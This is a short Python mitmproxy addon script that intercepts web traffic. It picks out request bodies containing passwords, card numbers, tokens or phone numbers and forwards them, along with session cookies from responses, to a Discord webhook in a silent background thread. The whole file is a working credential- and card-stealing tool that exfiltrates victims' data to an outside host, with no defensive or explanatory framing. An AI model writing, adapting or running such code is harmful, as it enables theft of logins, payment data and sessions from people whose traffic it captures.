# proxy.py
from mitmproxy import http
import json
import urllib.request
import threading
import os

DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK', '')

def send_to_discord(message):
    if not DISCORD_WEBHOOK:
        return
    def send():
        try:
            data = json.dumps({"content": message[:1900]}).encode('utf-8')
            req = urllib.request.Request(DISCORD_WEBHOOK, data=data, headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req, timeout=5)
        except:
            pass
    threading.Thread(target=send, daemon=True).start()

def request(flow: http.HTTPFlow) -> None:
    url = flow.request.pretty_url
    method = flow.request.method
    msg = f"REQUEST\n{method} {url}\n"
    if flow.request.content:
        body = flow.request.content.decode('utf-8', errors='ignore')
        if 'password' in body.lower() or 'pass' in body.lower():
            msg += f"PASSWORD\n{body}\n"
        elif 'card' in body.lower():
            msg += f"CARD\n{body}\n"
        elif 'token' in body.lower():
            msg += f"TOKEN\n{body}\n"
        elif 'phone' in body.lower():
            msg += f"PHONE\n{body}\n"
        else:
            msg += f"Body: {body[:500]}\n"
    send_to_discord(msg)

def response(flow: http.HTTPFlow) -> None:
    headers = dict(flow.response.headers)
    if 'set-cookie' in headers:
        send_to_discord(f"COOKIE\n{headers.get('set-cookie', '')}\n")
